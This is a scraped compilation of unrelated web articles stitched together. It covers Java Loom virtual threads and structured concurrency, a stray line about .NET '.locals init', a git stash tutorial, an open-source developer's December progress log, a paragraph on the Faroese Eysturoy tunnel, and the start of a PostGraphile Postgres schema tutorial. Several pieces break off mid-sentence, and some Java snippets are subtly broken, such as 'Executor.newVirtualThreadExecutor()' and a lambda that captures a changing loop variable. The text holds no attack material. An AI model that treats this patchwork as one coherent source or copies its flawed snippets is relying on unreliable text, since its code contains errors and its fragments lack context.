<pre>Thread thread = Thread.startVirtualThread(runnable);
  // <cite>Note that the thread is already started</cite></pre>
<p>This is good for demos, tutorials or quick-and-dirty experiments in JShell.</p>
<p>For more customization, there is a builder API:</p>
<pre>Thread thread = Thread.builder()
   .virtual()
   .name(taskname)
   .task(runnable)
   .build();</pre>
<p>However, as you have been told for many years now, it is better to use an executor service than to manually construct <code>Thread</code> instances. The static method <code>Executors.newVirtualThreadExecutor()</code> provides one. (The existing executor services are not useful for virtual threads. It would be counterproductive to pool them!)</p>
<p>For example,</p>
<pre>ExecutorService exec = Executors.newVirtualThreadExecutor();
exec.submit(runnable1);
exec.submit(runnable2);
</pre>
<p>As with the other factory methods in the <code>Executors</code> class, you can optionally supply a <code>ThreadFactory</code>. And the new <code>Thread.Builder</code> class has an easy way to provide a factory, instead of a single instance:</p>
<pre>ThreadFactory factory = Thread.builder()
   .virtual()
   .name(taskname)
   .task(runnable)
   .<b>factory()</b>;

ExecutorService exec = Executors.newThreadExecutor(factory);
</pre>
<p>Let’s try this out. As a first test, we just sleep in each task.</p>
<pre>import java.util.concurrent.*;

public class Test {
   public static int DELAY = 10_000;
   public static int NTASKS = 1_000_000;

   public static void run(Object obj) {
      try {
         Thread.sleep((int) (DELAY * Math.random()));
      } catch (InterruptedException ex) {
         ex.printStackTrace();
      }
      System.out.println(obj);
   }

   public static void main(String[] args) {
      ExecutorService exec = Executors.newVirtualThreadExecutor();
      for (int i = 1; i &lt;= NTASKS; i++) {
         String taskname = "task-" + i;
         exec.submit(() -&gt; run(taskname));
      }
      exec.close();
   }
}
</pre>
<p>Run the program and it just works. Then try using OS threads—change to <code>Executors.newCachedThreadPool()</code> or <code>Executors.newFixedThreadPool(NTASKS)</code>. The program will run out of memory; on my laptop, after about 25,000 threads.</p>
<p>Ok, but in practice, you don’t want to sleep, but do useful work. Consider a program adapted from one of <a href="https://www.javaspecialists.eu/about/heinz/">Heinz Kabutz</a>‘ puzzlers, The program fetches a daily image, from Dilbert or Wikimedia. It consists of classes <a href="http://horstmann.com/unblog/2019-07-27/dailyImages/ImageProcessor.java"><code>ImageProcessor</code></a> and <a href="http://horstmann.com/unblog/2019-07-27/dailyImages/ImageInfo.java"><code>ImageInfo</code></a>. The code is an impenetrable maze of twisty passages, all alike (i.e. helper functions yielding completable futures).</p>
<p>With virtual threads, simply read web contents synchronously. It blocks, but we don’t care. All the complexity goes away. The control flow is simple and comprehensible.</p>
<pre>exec.submit(() -&gt; {
    String pageURL = info.getUrlForDate(date);
    String page = getSync(pageURL, HttpResponse.BodyHandlers.ofString());
    String imageURL = info.findImage(page).getImagePath();
    byte[] image = getSync(imageURL, HttpResponse.BodyHandlers.ofByteArray());
    info.setImageData(image);
    process(info);
    return null;
});</pre>
<p>Here is the simplified <a href="http://horstmann.com/unblog/2020-12-05/dailyImages/ImageProcessor.java"><code>ImageProcessor</code></a> code.</p>
<p><b>Pro tip: </b>The statement <code>return null;</code> makes the lambda into a <code>Callable</code> instead of a <code>Runnable</code>, so that you don’t have to catch checked exceptions 😜</p>
<p>Try this out with something you care about. Call web services and make database connections, without worrying about callbacks. When blocking is cheap, a whole lot of accidental complexity goes away. Of course, to use this in a web app framework, you’ll have to wait for your framework provider to run your code in virtual threads.</p>
<h2>Structured Concurrency</h2>
<p>In <a href="https://vorpus.org/blog/notes-on-structured-concurrency-or-go-statement-considered-harmful/">this highly recommended article</a> (from which the images below are taken), Nathaniel Smith proposes structured forms of concurrency. Here is his central argument. Launching a task in a new thread is really no better than programming with GOTO, i.e. harmful:</p>
<pre>new Thread(runnable).start();</pre>
<p><img src="http://horstmann.com/unblog/2019-12-05/sequential-and-go-to-schematic.svg" alt=".svg" width="38%"></p>
<p>When multiple threads run without coordination, it’s spaghetti code all over again. In the 1960s, structured programming replaced <code>goto</code> with branches, loops, and functions:</p>
<p><img src="http://horstmann.com/unblog/2019-12-05/control-schematics.svg" alt=".svg" width="42%"></p>
<p>When you look at a line of code, you know how the program got there.</p>
<p>Structured concurrency does the same for concurrent tasks. We should know, from reading the program text, when they all finish.</p>
<p><img src="http://horstmann.com/unblog/2019-12-05/nursery-schematic-unlabeled.svg" alt=".svg" width="30%"></p>
<p>That way we can control the resources that the tasks use, and we know when it is time to move on.</p>
<p>In Loom, the <code>ExecutorService</code> implements this basic construct. <code>ExecutorService</code> has a <code>close</code> method that blocks until all of its virtual threads have completed. (I used this method in the first sample program to keep <code>main</code> alive until all virtual threads are done. In the past, you had to call the <code>awaitTermination</code> method instead.)</p>
<p>Conveniently, <code>ExecutorService</code> implements the <code>AutoCloseable</code> interface, so that you can just use a <code>try</code>-with-resources statement:</p>
<pre>try (ExecutorService exec = Executor.newVirtualThreadExecutor()) {
   for (int i = 0; i &lt; NTASKS; i++) {
      exec.schedule(() -&gt; run(i));
   }
} // <cite>Blocks until all threads completed</cite>
</pre>
<p>I wrote a simple web crawler as a demonstration of virtual threads—here is the <a href="http://horstmann.com/unblog/2020-12-05/Crawler.java"><code>Crawler</code></a> class. In my first attempt, I fired off a new virtual thread for each URL in a page. If I had wanted to become Google, I could have let my crawler run forever. But I wanted to go no more than 3 hops from the starting point. With “fire and forget”, there is no way of knowing when the recursion is done.</p>
<p>Instead, for each page, I make a new executor service and wait for completion. That way, the whole program completes when all pages have been crawled.</p>
<p>This seems a lot of blocking. But in Loom, blocking is cheap, so we shouldn’t worry about that.</p>
<p>We are used to having one executor service as thread pool for all our tasks. But in Loom, you are encouraged to use a separate executor service for each task set.</p>
<h2>Deadlines</h2>
<p>When crawling the web, you are likely to encounter dead links. Reading from one should time out eventually, but it can take surprisingly long.</p>
<p>The standard remedy is, of course, to provide a timeout. Loom prefers deadlines to timeouts, so you specify</p>
<pre>ExecutorService exec = Executors.newVirtualThreadExecutor().withDeadline(
   Instant.now().plus(30, ChronoUnit.SECONDS))
</pre>
<p>Why deadlines? In general, timeouts compose poorly. Suppose you have to accomplish two sequential tasks with an overall timeout of 10 seconds. You don’t want to give each of the tasks a timeout of 5 seconds. After all, if one takes 6 seconds and the other 3 seconds, you still come in under the finish line. To get the timeout of the second task, you’d have to measure the duration of the first task and subtract that from the overall timeout. With deadlines, it is much simpler. Each task gets the same deadline.</p>
<p>The call <code>exec.close()</code> blocks until all virtual threads have completed or the …</p></div></div>

One of them is the ability to suppress emitting <code>.locals init</code> flag. This feature allows to improve the performance of a method by not zeroing the local variables before executing the method.

  <div itemprop="articleBody">
    <p>It was only when I recently heard someone else say, “git stash is scary” that I realized it was top of my list of fears too. It just usually feels like there’s a chance I’ll just lose all of my in progress work to the depths of stashes and never be able to get the right incantation of <code>git</code> commands to reincarnate my code.</p>

<h3 id="what-does-git-stash-do">What does git stash do?</h3>

<p>Let me backtrack a minute! I haven’t yet explained what <code>git stash</code> even does. On the most basic level, <code>git stash</code> is one way to store in progress work in <code>git</code> for subsequent access, leaving behind a clean working directory.</p>

<p><em>Meta-note</em>: this post will be easiest to follow along if you open up a terminal and play around with <code>git stash</code> as you’re reading! The lack of syntax highlighting makes it a little tricky to see git additions / deletions. You can play around with any git repo you have, or clone <a href="https://github.com/githubtraining/hellogitworld">this hello world one</a> locally to work in a complete sandbox!</p>

<h3 id="stacks">Stacks</h3>

<p>Stashes are more easily understood as a basic last in, first out stack.</p>

<ul>
  <li><code>git stash push</code> (equivalent to <code>git stash</code> when used with no arguments) will push any local changes onto the stash and leave a clean working directory.</li>
</ul>

<div><div><pre><code><span>$ </span>git status

<span>$ </span>git status
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

nothing to commit, working tree clean

</code></pre></div></div>

<p>There are a plethora of arguments we can pass to <code>git stash push</code>. The ones I find most helpful are:</p>

<ul>
  <li><code>-m &lt;message&gt;</code> saves the stash with a message, can be helpful for our future selves</li>
</ul>

<div><div><pre><code><span>$ </span>git stash push <span>-m</span> <span>"description"</span>
Saved working directory and index state On main: description
</code></pre></div></div>

<ul>
  <li><code>-p</code> patches changes (used like <code>git add -p</code>), allowing us to select which hunks to add to the stash. <a href="https://www.gnu.org/software/diffutils/manual/html_node/Detailed-Unified.html">Hunks</a> are areas where two files differ. Git will partition files into hunks for us!</li>
</ul>

<div><div><pre><code><span>$ </span>git stash push <span>-p</span>
....
Details about the hunk
....
<span>(</span>1/1<span>)</span> Stash this hunk <span>[</span>y,n,q,a,d,e,?]?
</code></pre></div></div>

<ul>
  <li><code>-u</code> includes untracked files in the stash. Without this flag, a file that <code>git</code> had never seen before would not be included in a stash</li>
</ul>

<div><div><pre><code><span>$ </span><span>touch </span>new-file
<span>$ </span>git status
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

Untracked files:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to include <span>in </span>what will be committed<span>)</span>
	new-file

nothing added to commit but untracked files present <span>(</span>use <span>"git add"</span> to track<span>)</span>

<span>$ </span>git stash push <span>-u</span>
Saved working directory and index state WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<ul>
  <li><code>-k</code> keeps the files (or hunks) which were staged. Without this option, when we apply a stash, nothing will be staged. More on applying in the next section!</li>
</ul>

<h3 id="accessing-the-stash">Accessing the stash</h3>

<p>Okay, we can now push changes onto the stash. But…. they’re still the stash abyss if we have no way of accessing them.</p>

<p><code>git stash list</code> shows us what is on the stash:</p>

<div><div><pre><code><span>$ </span>git stash list
stash@<span>{</span>0<span>}</span>: On main: Clear description of these changes
stash@<span>{</span>1<span>}</span>: WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<p>This is where the <code>-m</code> message flag from earlier will be incredibly helpful. The first item in my stash had a message (<code>Clear description of these changes</code>), the second did not.</p>

<p>Okay, okay. We can now <em>see</em> what’s on the stash. But how do we access anything on the stash? Or remove it from the stash?</p>

<p><code>git stash show</code> will show us the difference between the top item on the stash, and our current working directory:</p>

<div><div><pre><code><span>$ </span>git stash show
 README.md | 1 +
 1 file changed, 1 insertion<span>(</span>+<span>)</span>
</code></pre></div></div>

<p>If we want to reference a different set of changes on the stash, and not the most recent one, we can use the stash index of those changes. As we can see above, each item on the stash has an index, and can be referred to by <code>stash@{index}</code></p>

<p>So, to see the set of changes in the next item on our stack, we can run:</p>

<div><div><pre><code><span>$ </span>git stash show stash@<span>{</span>1<span>}</span>
 README.md | 2 +-
 1 file changed, 1 insertion<span>(</span>+<span>)</span>, 1 deletion<span>(</span>-<span>)</span>
</code></pre></div></div>
<p>Neat, so we now know how to get the differences and look at what’s in the stash. But to actually access what’s on the stash, we’ll need <code>git stash apply [&lt;stash&gt;]</code>. It similarly can take an argument with the stash index to reference something later in the stash. If no argument is provided, it will default to the most recent set of changes we put in the stash (the ones at <code>stash@{0}</code>)</p>

<div><div><pre><code><span>$ </span>git stash apply stash@<span>{</span>1<span>}</span>
On branch main
Your branch is up to <span>date </span>with <span>'origin/main'</span><span>.</span>

Changes not staged <span>for </span>commit:
  <span>(</span>use <span>"git add &lt;file&gt;..."</span> to update what will be committed<span>)</span>
  <span>(</span>use <span>"git restore &lt;file&gt;..."</span> to discard changes <span>in </span>working directory<span>)</span>
	modified:   README.md

no changes added to commit <span>(</span>use <span>"git add"</span> and/or <span>"git commit -a"</span><span>)</span>
</code></pre></div></div>

<h4 id="removing-from-the-stash">Removing from the stash</h4>

<p>However, <code>git stash apply</code> will not <em>remove</em> the changes from the stash. If we look at the stash now, we’ll see it’s the same as it was:</p>

<div><div><pre><code><span>$ </span>git stash list
stash@<span>{</span>0<span>}</span>: On main: Clear description of these changes
stash@<span>{</span>1<span>}</span>: WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<p>In order to remove a set of changes from the stash, we can use <code>git stash drop [&lt;stash&gt;]</code></p>

<div><div><pre><code><span>$ </span>git stash drop stash@<span>{</span>0<span>}</span>
Dropped refs/stash@<span>{</span>0<span>}</span> <span>(</span>b09812812eb27de2cb49bfd02aba43889362b6de<span>)</span>

<span>$ </span>git stash list
stash@<span>{</span>0<span>}</span>: WIP on main: 6ab43aa Initial commit
</code></pre></div></div>

<p>We can see that the set of changes at <code>stash@{0}</code> are now no longer on the stash, and the set of changes which were at <code>stash@{1}</code> are now at <code>stash@{0}</code>.</p>

<p>If we want to <code>apply</code> and <code>drop</code> a set of changes, we can conveniently use <code>git stash pop [&lt;stash&gt;]</code>. <code>pop</code> will only also <code>drop</code> if there’s no merge conflict.</p>

<p>To clear the stash completely, we can run <code>git stash clear</code>. This is the <em>actual</em> scary command which will cause us to lose any work in progress that you had stashed. Only run <code>git stash clear</code> if you never again want to access what is currently on the stash.</p>

<h3 id="why-stash">Why stash?</h3>

<p>So we’ve learned how to use <code>git stash</code>, but still haven’t covered <em>why</em> to use it. Stashing is intended to be a quick and easy way to get to a clean working state while not losing in progress work. And it is! Both quick, and now hopefully easy!</p>

<p>One example of when I might use <code>git stash</code> is if I’m in progress on some changes, but realize I want to amend a prior commit. I can stash the changes, amend the commit, and then apply the stash to get back to where I was.</p>

<p>Another is if I am trying to experiment with a few different ways to solve a problem, and want small, quick examples down each solution path. I might create stashes with all of my examples, and then pick the best and pursue that set of changes in a branch structure.</p>

<p>Additionally, stashing is especially helpful because it is branch agnostic. That is to say, if we switch branches, our stash will remain the same. This means stashing can also be a convenient way to carry changes through different branches.</p>

<h3 id="when-not-to-stash">When not to stash</h3>

<p>Equally import to why stash is when <em>not</em> to use it.</p>

<p>Stashing was built for convenience, and is not intended to be a permanent way to save work; that’s what branches and commits are for. Stashing also only works locally, you can’t push stashes to a repo or have others pull them down.</p>

<h3 id="branches-from-stash">Branches from stash</h3>

<p>Speaking of branches, another fun feature of stashes is that we can create a branch directly from a stash. This is done using <code>git stash branch &lt;branch_name&gt; [&lt;stash&gt;]</code> This will also drop the changes from the stash, equivalent to a <code>git stash pop</code> not a <code>git stash apply</code>.</p>

<h3 id="in-summary">In summary</h3>

<ul>
  <li><code>git stash</code> operates on a LIFO stack of sets of changes</li>
  <li><code>git stash list</code> shows what’s on the stash</li>
  <li><code>git stash push</code> pushes to the stash</li>
  <li><code>git stash apply</code> access changes on the stash</li>
  <li><code>git stash drop</code> removes changes from the stash</li>
  <li><code>git stash pop</code> does an <code>apply</code> and a <code>drop</code></li>
  <li>These default to the most recent item on the stash, to reference another one use <code>stash@{index}</code> where you can determine the index from <code>git stash list</code></li>
  <li>Some of these have flags which make them more convenient, including: <code>-m</code> message, <code>-p</code> patch, <code>-u</code> include untracked files, <code>-k</code> keep staged changes staged</li>

<p>Hopefully you, too, can now add <code>git stash</code> to the list of fears you’ve conquered!</p>

<p>For further reading on stashing, take a look at the <a href="https://git-scm.com/docs/git-stash">git stash docs</a>. For further reading on <a href="https://www.brainyquote.com/topics/fear-quotes">conquering fears</a>, here is a favorite quote of mine, “Nothing in life is to be feared, it is only to be understood. Now is the time to understand more, so that we may fear less.” - <a href="https://en.wikipedia.org/wiki/Marie_Curie">Marie Curie</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p>Ah, it’s again this magical time of the year - the Advent!
When I was little I associated it mostly with advent candy boxes
with a different candy for each day of the Advent, but these days
I mostly associate this period with the famous <a href="https://adventofcode.com/">Advent of Code</a>.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>As much as I love solving puzzles, I’ve realized lately that probably
it’s not the best use of my limited free time. Last year I opted to do
an <a href="http://metaredux.com/posts/2019/12/01/meta-advent-2019.html">blogging challenge</a>, instead of the Advent of Code, and this
year I’m challenging myself to contribute something (meaningful) to my <a href="http://metaredux.com/projects">open-source
projects</a> every day from the 1st of December to Christmas.
Fun times ahead!</p>

<p>Today is the 3rd of December already, so I guess I have to report what I’ve done so far.</p>

<h2 id="dec-1">Dec 1</h2>

<ul>
  <li>Shipped <a href="https://github.com/rubocop-hq/rubocop/releases/tag/v1.5.0">RuboCop 1.5</a></li>
  <li>Lots of improvements to the <a href="https://guide.clojure.style/">Clojure Style Guide</a>
    <ul>
      <li>New sections on <a href="https://guide.clojure.style/#guiding-principles">guiding principles</a> and <a href="https://guide.clojure.style/#a-note-about-consistency">consistency</a></li>
      <li>Documented the <a href="https://guide.clojure.style/#sources-of-inspiration">sources of inspiration</a></li>
      <li>Added lots of new code examples (e.g. <a href="https://guide.clojure.style/#comments">here</a>)</li>
      <li>Fixed many headings that had broken wording after the automated conversion to the current structure last year (each guideline now has a title, and the titles were auto-generated from the old permalinks associated with the guidelines)</li>
    </ul>
  </li>
</ul>

<p>I hope to gradually clean up the backlog for improvements of the style guide in the months to come. I’ll also mention here that I wouldn’t mind
some volunteers willing to help document the best practices for working with <code>cljc</code> and <code>clojure.spec</code>.</p>

<h2 id="dec-2">Dec 2</h2>

<ul>
  <li>Shipped <a href="https://github.com/rubocop-hq/rubocop/releases/tag/v1.5.1">RuboCop 1.5.1</a></li>
  <li><a href="https://github.com/bbatsov/projectile">Projectile</a>
    <ul>
      <li>Groomed the backlog (replied to some tickets, closed some tickets that were addressed/irrelevant, added tags to everything else)</li>
      <li>Merged a few outstanding PRs (see the <a href="https://github.com/bbatsov/projectile/blob/master/CHANGELOG.md#bugs-fixed">changelog</a> for details)</li>
      <li>Lots of improvements to the documentation site
        <ul>
          <li>Improved <a href="https://docs.projectile.mx/projectile/usage.html">Usage</a> page (better basic setup instructions, plus coverage of the mighty but elusive Projectile Commander)</li>
          <li>Improved <a href="https://docs.projectile.mx/projectile/projects.html">Projects</a> page (in particular, you’ll find there a lot of information about the mythical and mystical <code>projectile-project-root-functions</code>)</li>
          <li>Improved <a href="https://docs.projectile.mx/projectile/configuration.html">Configuration</a></li>
        </ul>
      </li>
    </ul>
  </li>
</ul>

<p>It always feels great to revisit Projectile, as it’s both the first open-source project I ever created and the project I use more than anything else.</p>

<h2 id="dec-3-today">Dec 3 (today)</h2>

<ul>
  <li>More work on Projectile’s documentation and grooming the backlog</li>
  <li>Preparing for another RuboCop bug-fix release (1.5.2 might land later today)</li>
</ul>

<h2 id="looking-forward">Looking Forward</h2>

<p>So, what’s next?
My main priorities for the Advent of OSS are currently:</p>

<ul>
  <li>Polish the Clojure Style Guide</li>
  <li>Ship CIDER 1.0</li>
  <li>Ship Emacs Prelude 1.1</li>
  <li>Clean up Projectile’s backlog</li>
</ul>

<p>I probably won’t be able to achieve them all, but I’ve been told it’s good to be ambitious. If someone wants to help me out, be my guest.
My projects have plenty of tickets tagged with <code>Good First Issue</code> that you might try tackling.</p>

<p>I’ll try to post some updates here every few days, both to keep it
up-to-date with my progress and to keep myself honest. That’s all from
me for now. Keep hacking!</p>

<p><strong>P.S.</strong> In the time-honored tradition of the Advent, I’m inviting all of you to join my on the Christmas OSS adventure and see how far are you willing
to go! It will be fun!</p>

<p>The Eysturoyartunnilin (or Eysturoy Tunnel, earlier known as Skálafjarðartunnilin) is a large infrastructure project which connects the island of Streymoy to the island of Eysturoy through a sub-sea road tunnel under the Tangafjørður sound in the Faroe Islands. It also crosses the southern part of Skálafjørður and connects the towns of Runavík on the eastern side and Strendur on the western side of the fjord. Altogether, the three-branch sub-sea tunnel measures 11.24 kilometres (6.8 miles) long, including an underwater roundabout. Construction costs are estimated to be around a billion DKK. It will open for traffic in December 2020.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The Postgres database is rich with features well beyond that of any other
database. However, most developers do not know the extent to which they can
leverage the features in Postgres to completely express their application
business logic in the database.</p>
<p>Often developers may find themselves re-implementing authentication and
authorization in their apps, when Postgres comes with application level security
features out of the box. Or perhaps developers may rewrite basic insert
functions with some extra app logic where that too may be handled in the
database.</p>
<p>This reimplementation of features that come with Postgres is not just an
inefficient way to spend developer resources, but may also result in an
interface that is slower than if the logic was implemented in Postgres itself.
PostGraphile aims to make developers more efficient and their APIs faster by
packaging the repeatable work in one open source project that encourages
community contributions.</p>
<p>In this tutorial we will walk through the Postgres schema design for a forum
application with users who can login and write forum posts. While we will
discuss how you can use the schema we create with PostGraphile, this article
should be useful for anyone designing a Postgres schema.</p>
<p>If you haven't installed PostGraphile already, you can follow our
<a href="https://www.graphile.org/postgraphile/quick-start-guide/">Quick Start Guide</a> to get PostGraphile up and
running.</p>

<h4 id="setting-up-your-schemas"><a href="#setting-up-your-schemas" aria-label="setting up your schemas permalink"></a>Setting Up Your Schemas</h4>
<p>All of our database objects will go into one or two custom Postgres schemas. A
schema is essentially a namespace, it allows you to create tables with the same
name like <code>a.person</code> and <code>b.person</code>.</p>
<p>You can name your schema anything, we recommend naming your schema after your
app. This way if you are working on multiple apps in the same database (this
might only realistically happen in development), you can easily query the
databases of the different apps. We are going to create two schemas:
<code>forum_example</code>, and <code>forum_example_private</code>. To create these schemas we use the
<a href="https://www.postgresql.org/docs/current/static/sql-createschema.html"><code>CREATE SCHEMA</code></a>
command.</p>
<div data-language="sql"><pre><code><span>create</span> <span>schema</span> forum_example<span>;</span>
<span>create</span> <span>schema</span> forum_example_private<span>;</span></code></pre></div>
<p>You could create more or less schemas, it is all up to you and how you want to
structure your database. We decided to create two schemas. One of which,
<code>forum_example</code>, is meant to hold data users can see, whereas
<code>forum_example_private</code> will never be directly accessible to users.</p>
<p>Theoretically we want a user to be able to log in directly to our Postgres
database, and only be able to create, read, update, and delete data for their
user all within SQL. This is a mindshift from how we traditionally use a SQL
database. Normally, we assume whoever is querying the database has full
visibility into the system as the only one with database access is our
application. In this tutorial, we want to restrict access at the database level.
Don’t worry though! Postgres is very secure about this, users will have no more
permissions than that which you explicitly grant.</p>
<blockquote>
<p><strong>Note:</strong> When starting PostGraphile, you will want to use the name of the
schema you created with the <code>--schema</code> option, like so:
<code>postgraphile --schema forum_example</code>. Also, don’t forget to add the <code>--watch</code>
flag, with watch mode enabled PostGraphile will update your API as we add
tables and types throughout this tutorial.</p>
</blockquote>
<h4 id="the-person-table"><a href="#the-person-table" aria-label="the person table permalink"></a>The Person Table</h4>
<p>Now we are going to create the tables in our database which will correspond to
our users. We will do this by running the Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-createtable.html"><code>CREATE TABLE</code></a>
command. Here is the definition for our person table:</p>
<div data-language="sql"><pre><code><span>create</span> <span>table</span> forum_example<span>.</span>person <span>(</span>
  id               <span>serial</span> <span>primary</span> <span>key</span><span>,</span>
  first_name       <span>text</span> <span>not</span> <span>null</span> <span>check</span> <span>(</span>char_length<span>(</span>first_name<span>)</span> <span>&lt;</span> <span>80</span><span>)</span><span>,</span>
  last_name        <span>text</span> <span>check</span> <span>(</span>char_length<span>(</span>last_name<span>)</span> <span>&lt;</span> <span>80</span><span>)</span><span>,</span>
  about            <span>text</span><span>,</span>
  created_at       <span>timestamp</span> <span>default</span> <span>now</span><span>(</span><span>)</span>
<span>)</span><span>;</span></code></pre></div>
<p>Now we have created a table with <code>id</code>, <code>first_name</code>, <code>last_name</code>, <code>about</code>, and
<code>created_at</code> columns (we will add an <code>updated_at</code> column later). Let’s break
down exactly what each line in this command does, we will only do this once. If
you already understand, you can skip ahead.</p>
<ol>
<li><code>create table forum_example.person</code>: This tells Postgres that we are
creating a table in the <code>forum_example</code> schema named <code>person</code>. This table
will represent all of our forum’s users.</li>
<li><code>id serial primary key</code>: This line establishes an auto-incrementing id field
which is always guaranteed to be unique. The first person we create will
have an id of 1, the second user will have an id of 2, and so on. The
<code>primary key</code> bit is also very important. PostGraphile will use the
<code>primary key</code> of a table in many places to uniquely identify an object,
including the globally unique id field.</li>
<li><code>first_name text not null check (char_length(first_name) &lt; 80)</code>: We want all
of our users to enter their first name and last name seperately, so this
column definition will create a column named <code>first_name</code>, of type <code>text</code>,
that is required (<code>not null</code>), and that must be less than 80 characters long
(<code>check (char_length(first_name) &lt; 80)</code>).
<a href="https://www.postgresql.org/docs/current/static/ddl-constraints.html">Check constraints</a>
are a very powerful feature in Postgres for data validation.</li>
<li><code>last_name text check (char_length(last_name) &lt; 80)</code>: This is very similar
to our column definition for <code>first_name</code>, except it is missing <code>not null</code>.
This means that unlike the <code>first_name</code> column, <code>last_name</code> is not required.</li>
<li><code>about text</code>: We want users to be able to express themselves! So they get to
write a mini forum post which will go on their profile page.</li>
<li><code>created_at timestamp default now()</code>: This final column definition will
provide us with some extra meta-information about their user. If not
specified explicitly, the <code>created_at</code> timestamp will default to the time
the row was inserted.</li>
</ol>
<p>And that’s our person table! Pretty simple, right?</p>
<p>The syntax and features of the Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-createtable.html"><code>CREATE TABLE</code></a>
command are fairly easy to learn and understand. Creating tables is the easiest,
but also the most fundamental part of your schema design.</p>
<blockquote>
<p><strong>Note:</strong> We prefer singular identifers like <code>forum_example.person</code> over
<code>forum_example.people</code> because when you create a table, it is like you are
creating a class in a statically typed language. Classes have singular names
like “Person” while collections will often have plural names like “People.”
Table as a class is a better analogy than table as a collection because
Postgres itself will internally call tables “classes.”</p>
</blockquote>
<blockquote>
<p><strong>Note:</strong> In case you don’t like serial id of our table above, an alternative
to the <code>serial</code> primary key is UUIDs. To use UUIDs you would just need to add
the popular UUID extension, <code>uuid-ossp</code>, in your database setup, and specify a
default in your table creation. Like so:</p>
<div data-language="sql"><pre><code><span>create</span> extension <span>if</span> <span>not</span> <span>exists</span> <span>"uuid-ossp"</span><span>;</span>

<span>create</span> <span>table</span> forum_example<span>.</span>person <span>(</span>
  id uuid <span>primary</span> <span>key</span> <span>default</span> uuid_generate_v1mc<span>(</span><span>)</span><span>,</span>
  <span>.</span><span>.</span><span>.</span>
<span>)</span><span>;</span></code></pre></div>
<p>Alternatively you could use fully random UUIDs:</p>
<div data-language="sql"><pre><code><span>create</span> extension <span>if</span> <span>not</span> <span>exists</span> <span>"pgcrypto"</span><span>;</span>

<span>create</span> <span>table</span> forum_example<span>.</span>person <span>(</span>
  id uuid <span>primary</span> <span>key</span> <span>default</span> gen_random_uuid<span>(</span><span>)</span><span>,</span>
  <span>.</span><span>.</span><span>.</span>
<span>)</span><span>;</span></code></pre></div>
<p>There are pros and cons to both approaches, choose what works best for your
application!</p>

<p>Now that we have created our table, we want to document it within the Postgres
database. By adding comments to our table and its columns using the Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-comment.html"><code>COMMENT</code></a>
command, we will allow tools like PostGraphile to display rich domain specific
documentation.</p>
<p>To add comments, just see the SQL below:</p>
<div data-language="sql"><pre><code><span>comment</span> <span>on</span> <span>table</span> forum_example<span>.</span>person <span>is</span> <span>'A user of the forum.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>id <span>is</span> <span>'The primary unique identifier for the person.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>first_name <span>is</span> <span>'The person’s first name.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>last_name <span>is</span> <span>'The person’s last name.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>about <span>is</span> <span>'A short description about the user, written by the user.'</span><span>;</span>
<span>comment</span> <span>on</span> <span>column</span> forum_example<span>.</span>person<span>.</span>created_at <span>is</span> <span>'The time this person was created.'</span><span>;</span></code></pre></div>
<p>Incredibly simple, yet also incredibly powerful.</p>
<blockquote>
<p><strong>Note:</strong> Feel free to write your comments in Markdown! Most tools, including
GraphiQL which PostGraphile uses, will render your comments with the
appropriate styles.</p>
</blockquote>
<p>With this we have completed our person table, now let’s create a table for our
forum posts.</p>
<h4 id="the-post-table"><a href="#the-post-table" aria-label="the post table permalink"></a>The Post Table</h4>
<p>The users of our forum will want to be able to create posts. That’s the entire
reason we have a forum after all. To create the post table we go through a very
similar process as creating our <code>forum_example.person</code> table, but first we want
to create a type we will use in one of the columns. See the SQL below:</p>
<div data-language="sql"><pre><code><span>create</span> <span>type</span> forum_example<span>.</span>post_topic <span>as</span> <span>enum</span> <span>(</span>
  <span>'discussion'</span><span>,</span>
  <span>'inspiration'</span><span>,</span>
  <span>'help'</span><span>,</span>
  <span>'showcase'</span>
<span>)</span><span>;</span></code></pre></div>
<p>The Postgres
<a href="https://www.postgresql.org/docs/current/static/sql-createtype.html"><code>CREATE TYPE</code></a>
command will let you create a custom type in your database which will allow you
to do some really cool things. You can create a
<a href="https://www.postgresql.org/docs/current/static/rowtypes.html">composite type</a>
which is basically a typed object in GraphQL terms, you can create a
<a href="https://www.postgresql.org/docs/current/static/rangetypes.html">range type</a>
which represents exactly what you might think, or you can create an
<a href="https://www.postgresql.org/docs/current/static/datatype-enum.html">enum type</a>
which is what we did here.</p>
<p>Enum types are a static set of values, you <em>must</em> use one of the string values
that make up the enum in any column of the enum’s type. Having this type is
useful for us, because we want our forum posts to have one, or none, topics so
user’s may easily see what a post is about.</p>
<blockquote>
<p><strong>Note:</strong> PostGraphile implements custom handling for user-defined types. An
enum type like that defined above will be turned into a GraphQL enum that
looks like:</p>
<div data-language="graphql"><pre><code><span>enum</span> <span>PostTopic</span> <span>{</span>
  <span>DISCUSSION</span>
  <span>INSPIRATION</span>
  <span>HELP</span>
  <span>SHOWCASE</span>
<span>}</span></code></pre></div>
<p>You can also create custom composite types which will turn into GraphQL object
types with PostGraphile.</p>
<div data-language="sql"><pre><code><span>create</span> <span>type</span> my_schema<span>.</span>my_type <span>as</span> <span>(</span>
  foo <span>integer</span><span>,</span>
  bar <span>integer</span>
<span>)</span><span>;</span></code></pre></div>
<p>Would become the following GraphQL type:</p>
<div data-language="graphql"><pre><code><span>type</span> <span>MyType</span> <span>{</span>
  <span>foo</span><span>:</span> Int
  <span>bar</span><span>:</span> Int
<span>}</span></code></pre></div>
</blockquote>
<p>Now it is time to actually create our post table:</p>
<div data-language="sql"><pre><code><span>create</span> <span>table</span> …</code></pre></div></div></div>

